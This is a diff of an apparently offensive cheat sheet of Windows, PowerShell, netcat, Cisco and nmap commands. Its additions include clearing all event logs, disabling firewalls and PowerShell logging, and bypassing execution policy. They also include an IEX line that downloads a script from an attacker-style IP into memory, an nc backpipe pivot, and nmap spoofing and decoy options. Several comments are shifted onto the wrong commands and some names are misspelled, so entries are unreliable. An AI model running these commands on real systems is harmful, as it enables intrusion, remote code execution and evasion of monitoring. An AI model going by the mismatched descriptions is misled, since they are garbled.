-services.msc                                                                                                        #Services control panel
-taskmgr.exe                                                                                                                #Task manager
-secpool.msc                                                                                                                #Security policy manager
-eventvwr.msc                                                                                                        #Event viewer
+type file                                                            #Display file contents
+del path\' .' /a /s /q /f                                            #Forceably delete all files in path
+find /I "str" filename                                               #Find "str"
+command | find /c /v ""                                              #Line count of cmd output
+at HH:Ml1 file [args] (i.e. at 14:45 cmd /c)                         #Schedule file to run
+runas /user: user " file [args] "                                    #Run file as user
+restart /r /t 0                                                      #Restart now
+tr -d '\15\32' win.txt unix.txt                                      #Removes CR & 'Z ('nix)
+makecab file                                                         #Native compression
+Wusa.exe /uninstall /kb: ###                                         #Uninstall patch
+cmd.exe "wevtutil qe Application /c:40 /f:text /rd:true"             #CLI Event Viewer
+lusrrngr.rnsc                                                        #Local user manager
+services.msc                                                         #Services control panel
+taskmgr.exe                                                          #Task manager
+secpool.msc                                                          #Security policy manager
+eventvwr.msc                                                         #Event viewer
 type c:\anyfile.exe > c:\winnt\system32\calc.exe:anyfile.exe         #Sets ADS
-star c:\winnt\system32\calc.exe:anyfile.exe                                                #executes an ADS
-Taskkill /PID <26356> /F                                                                                #Kill a process
+star c:\winnt\system32\calc.exe:anyfile.exe                          #executes an ADS
+Taskkill /PID <26356> /F                                             #Kill a process
+wevtutil el | Foreach-Object {wevtutil cl "$_"}                      #clear all logs
+
+
+********************  Windows Netsh Commands **********************
+netsh advfirewall firewall show rule name=all                                                                                           #Shows all firewall rules
+netsh advfirewall rule name="SQL Server" dir=in action=allow protocol=tcp localport=5555 enable=yes profile=any                         #Poke hole in firewall 
+netsh interface portproxy add v4tov4 listen port=4444 listenaddress=<thisboxIP> connectport=22 connectaddress=<T2IP> protocol=tcp       #Port Forwarding
+netsh advfirewall set currentprofile state off                                                                                          #Turns all firewalls off, Win 7 and up
+netsh advfirewall set allprofiles state off                                                                                             #Turns Current firewall off, Win 7 and up
 
 
 ********************  Windows Misc. Commands ***********************
@@ -479,10 +490,6 @@ Taskkill /PID <26356> /F                                                        
 rundll32.dll user32.dll LockWorkstation
 
 
-###DISABLE WINDOWS FIREWALL
-netsh advfirewall set currentprofile state off
-netsh advfirewall set allprofiles state off
- 
 ###NATIVE WINDOWS PORT FORWARD ( * MUST BE ADMIN)
 netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
 #Remove
@@ -539,16 +546,16 @@ schtasks.exe /create /tn MyTask /xml "C:\MyTask.xml" /f
 
 
 ********************  WMIC ***********************
-wmic [alias] get /?                                                                #List all attributes
-wmic [alias] call /?                                                        #Callable methods
-wmic process list full                                                        #Process attributes
-wmic startupwmic service                                                #Starts wmic service
-wmic ntdomain list                                                                #Domain and DC info
-wmic qfe                                                                                #List all patches
-wmic process call create "process name"                        #Execute process
-wmic process where name="process" call terminate#Terminate process                                                                        #
-wmic logicaldisk get description,name                        #View logical shares
-wmic cpu get DataWidth /format:list                                #Display 32 I I 64 bit
+wmic [alias] get /?                                     #List all attributes
+wmic [alias] call /?                                    #Callable methods
+wmic process list full                                  #Process attributes
+wmic startupwmic service                                #Starts wmic service
+wmic ntdomain list                                      #Domain and DC info
+wmic qfe                                                #List all patches
+wmic process call create "process name"                 #Execute process
+wmic process where name="process" call terminate        #Terminate process                                                                        #
+wmic logicaldisk get description,name                   #View logical shares
+wmic cpu get DataWidth /format:list                     #Display 32 I I 64 bit
 
 
 ###WMIC [ALIAS] [WHERE] [CLAUSE]
@@ -604,19 +611,48 @@ c. libesedb- http://code.google.com/p/libesedb/
 
 
 ********************  Powershell ***********************
-stop-transcript                                                                                                        #Stops recording
-get-content file                                                                                                #displays file contents
-get-help command -examples                                                                                #Shows examples of command
-get-command ' string '                                                                                        #Searches for cmd string
-get-service                                                                                                                #Displays services (stopservice, start-service)
-get-wmiobject -class win32_service                                                                #Display powershell version
-$PSVesionTable                                                                                                        #Run powershell 2.0 from 3.0
-powershell.exe -version 2.0                                                                                #Returns # of services
-get-service measure-object                                                                                #Returns list of PSDrives
-get-psdrive                                                                                                                #Returns only names
-get-process select -expandproperty name                                                        #Cmdlets that take creds
-get-help ' -parameter credential                                                                #Available WMI network cmds
-get-wmiobject -list -'network (Net.DNS]: :GetnostEntry(" ip")        #DNS Lookup
+powershell.exe -nop -exec bypass                                    #start powershell
+$psversiontable.psversion                                           #displays powershell version
+set-executionpolicy unrestricted                                    #allows execution of any scritp
+stop-transcript                                                     #Stops recording
+get-content file                                                    #displays file contents
+get-help command -examples                                          #Shows examples of command
+get-command ' string '                                              #Searches for cmd string
+get-service                                                         #Displays services (stopservice, start-service)
+get-wmiobject -class win32_service                                  #Display powershell version
+$PSVesionTable                                                      #Run powershell 2.0 from 3.0
+powershell.exe -version 2.0                                         #Returns # of services
+get-service measure-object                                          #Returns list of PSDrives
+get-psdrive                                                         #Returns only names
+get-process select -expandproperty name                             #Cmdlets that take creds
+get-help ' -parameter credential                                    #Available WMI network cmds
+get-wmiobject -list -'network (Net.DNS]: :GetnostEntry(" ip")       #DNS Lookup
+Get-FileHash <file> -Algorithm MD5                                  #Hash a file
+get-process -id <pid> | select -expand modules                      #list process dlls
+Get-ChildItem -path C:\Windows | Select-Object name, lastaccesstime, lastwritetime, creationtime | Sort-Object -Property lastwritetime | format-table -AutoSize     #file time stamps
+Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) }                           #liost files changed in last 2 hours
+$tasks = schtasks.exe /query /v /fo csv | ConvertFrom-Csv; $tasks | where-object {$_.'Scheduled Task State' -eq "Enabled"} | select-object TaskName, 'Task To Run'  #schtasks to run
+Get-wmiobject win32_service | where-object { $_.StartMode -eq 'Auto' } | format-list Name, DisplayName, PathName                                                    #Services
+get-winevent @{logname='application','security','system';starttime=[datetime]::today} | select logname, timecreated, id, message | formate-table -autosize          #Check event logs
+get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\Results\Detect" | Select-Object lastsuccesstime                         #last time windows updated
+get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"                                                                               # Windows Env variables
+get-itemproperty "HKCU:\network\*"                                                                                                                                  #list shares
+auditpol /get /catagory:*                                                                                                                                           #lists audit polocies
+IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps1")                                                                                 #download script to memory
+import-module c:\windows\system32\config\mslog.ps1                                                                                                                  #ingest script into memory
+
+###DISABLE POWERSHELL LOGGING%%
+reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableTranscripting = 1   # is on
+reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableInvocationHeader = 1
+reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription OutputDirectory = “”
+
+###Check for Powershell logs
+wevtutil el
+wevtutil gl "Windows Powershell"
+wevtutil sl "Windows Powershell" /ms:1024000
+wevtutil sl "windows Powershell" /rt:true /ab:fales
+wevtutil sl "windows Powershell" /ab:false
+
 
 
 ###CLEAR SECURITY & APPLCIATION EVENT LOG FOR REMOTE SERVER(SVROl)
@@ -686,7 +722,10 @@ at \\ip time "Powershell -Command 'Enable-PSRemoting -Force'"
 at \\ip time+1 "Powershell -Command 'Set-Item
 wsman:\localhost\client\trustedhosts ''"
 at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
-Enter-PSSession -ComputerName ip -Credential username
+$s1 = new-PSSession -ComputerName ip -Credential username
+enter-pssession -session $s1
+copy-item "C:\myRemoteData\Scripts" -Destination "C:\mylocaldata\Scripts" -fromSession $s1
+remove-pssession $s1
 
 
 ###LIST HOSTNAME AND IP FOR ALL DOMAIN COMPUTERS
@@ -1071,12 +1110,20 @@ onidle /i 30
 
 
 
+********************  Recon  ***********************
+nc -nv 1.1.1.1 80           #banner a web page
+GET / http/1.0
+
+rpcinfo -p <ip>             #unumerates linux boxes, needs apt-get install rpcbind nfs-common
+rpcclient -U "" <IP>        #enum windows boxes
+
+
 
 ********************  TTL Fingerprints ***********************
 Windows:        128
-Linux:                 64
-Network:         255
-Solar is:         255
+Linux:          64
+Network:        255
+Solar is:       255
 
 
 ********************  SubNetting ***********************
@@ -1119,9 +1166,9 @@ ff05::2- site-local routers
 
 
 ********************  IPv6 Interface Addresses ***********************
-fe80:: -                                link-local
-2001:: -                                 routable
-::a.b.c.d-                                 IPv4 compatible IPv6
+fe80:: -                        link-local
+2001:: -                        routable
+::a.b.c.d-                      IPv4 compatible IPv6
 ::ffff:a.b.c.d-                 IPv4 mapped IPv6
 
 
@@ -1143,27 +1190,27 @@ socat TCP-LISTEN:8080,reuseaddr,fork TCP6: [2001: :] :80
 
 
 ********************  Cisco Commands  ***********************
-enable                                                                                #Enter privilege mode
-#configure terminal                                                        #Configure interface
-(config)#interface fa0/0                                        #Configure FastEthernet 0/0
-(config-if)#ip addr 1.1.1.1 255.255.255.0        #Add IP to fa0/0
-(config)#line Vty 0 4                                                #Configure vty line
-(config-line)#login                                                        #1. Set telnet password
-(config-line)#password password                                #2. Set telnet password
-#show session                                                                #Open sessions
-#show version                                                                #IOS version
-#dir file systems                                                        #Available files
-#dir all-filesystems                                                #File information
-#dir /all                                                                        #Deleted files
-#show running-config                                                #Config loaded in mem
-#show startup-config                                                #Config loaded at boot
-#show ip interface brief                                        #Interfaces
-#show interface eO                                                        #Detailed interface info
-#show ip route                                                                #Routes
-#show access-lists                                                        #Access lists
-#terminal length 0                                                        #No limit on output
-#copy running-config startup-config                        #Replace run w/ start config
-#copy running-config tftp                                        #Copy run config to TFTP Svr
+enable                                          #Enter privilege mode
+#configure terminal                             #Configure interface
+(config)#interface fa0/0                        #Configure FastEthernet 0/0
+(config-if)#ip addr 1.1.1.1 255.255.255.0       #Add IP to fa0/0
+(config)#line Vty 0 4                           #Configure vty line
+(config-line)#login                             #1. Set telnet password
+(config-line)#password password                 #2. Set telnet password
+#show session                                   #Open sessions
+#show version                                   #IOS version
+#dir file systems                               #Available files
+#dir all-filesystems                            #File information
+#dir /all                                       #Deleted files
+#show running-config                            #Config loaded in mem
+#show startup-config                            #Config loaded at boot
+#show ip interface brief                        #Interfaces
+#show interface eO                              #Detailed interface info
+#show ip route                                  #Routes
+#show access-lists                              #Access lists
+#terminal length 0                              #No limit on output
+#copy running-config startup-config             #Replace run w/ start config
+#copy running-config tftp                       #Copy run config to TFTP Svr
 
 
 CISCO IOS 11.2-12.2 VULNERABILITY
@@ -1197,10 +1244,10 @@ snmpwalk ip 1.3 lgrep 77.1.2.25 -f4
 
 
 ********************  DNS ***********************
-./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20                #Reverse lookup for IP range:
-./dnsrecon.rb -t std -d domain.corn                                        #Retrieve standard DNS records:
+./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20            #Reverse lookup for IP range:
+./dnsrecon.rb -t std -d domain.corn                     #Retrieve standard DNS records:
 ./dnsrecon.rb -t brt -d domain.corn -w hosts.txt        #Enumerate subdomains:
-./dnsrecon -d domain.corn -t axfr                                        #DNS zone transfer:
+./dnsrecon -d domain.corn -t axfr                       #DNS zone transfer:
 
 
 ###NMAP REvERSE DNS LOOKUP AND OUTPUT PARSER
@@ -1420,7 +1467,7 @@ Comment out: #proxy_dns
 Comment out: #socks4a 12~.0.0.1 9050
 Add line: socks4        1.1.1.1        8080
 Scan through socks proxy:
-proxjchains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
+proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
 
 
 ###SOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2
@@ -1449,9 +1496,12 @@ On attacker (client)
 # nc -nv 12-.0.C.1 5555
 
 
+###NC PIVOT
+cd /tmp
+mknod backpipe q
+nc -v -l -p 4444 0<backpipe | nc <T1IP> 80 | tee backpipe
 
-
-********************  NMAP***********************
+********************  NMAP  ***********************
 
 
 ###SCAN TYPES
@@ -1463,40 +1513,40 @@ On attacker (client)
 
 
 ###OPTIONS
--p1-65535                                        #ports
--T[0-5]                                                #0=5m, 1=15s, 2= .4s
--n                                                #no dns resolution
--0                                                #OS detection
--A                                                #aggressive scan
+-p1-65535                                          #ports
+-T[0-5]                                            #0=5m, 1=15s, 2= .4s
+-n                                                 #no dns resolution
+-0                                                 #OS detection
+-A                                                 #aggressive scan
 -sv                                                #version detection
 -PN                                                #no ping
--6                                                #IPv6 scan
+-6                                                 #IPv6 scan
 --randomize-hosts
 
 
 ###OUTPUT I INPUT
--ox file                                                #write to xml file
--oG file                                                #write to grep file
--oA file                                                #save as all 3 formats
--iL file                                                #read hosts from file
--exclude file file                                #excludes hosts in file
+-ox file                                           #write to xml file
+-oG file                                           #write to grep file
+-oA file                                           #save as all 3 formats
+-iL file                                           #read hosts from file
+-exclude file file                                 #excludes hosts in file
 
 
 ###ADVANCED OPTIONS
 -sV -p#         --script=banner                        
 -traceroute
--ttl                                                #set TTL
---script                                                #runs script
+-ttl                                               #set TTL
+--script                                           #runs script
 
 
 ###FIREWALL EVASION
--f                                                #fragment packets
--s ip                                                #spoof src
--g #                                                #spoof src port
--D ip , ip                                        #Decoy
---mtu #                                                #set MTU size
+-f                                                 #fragment packets
+-s ip                                              #spoof src
+-g #                                               #spoof src port
+-D ip , ip                                         #Decoy
+--mtu #                                            #set MTU size
 --spoof-mac mac
---data-length size                                # append random data
+--data-length size                                 #append random data
 --scan-delay 5s
 
 
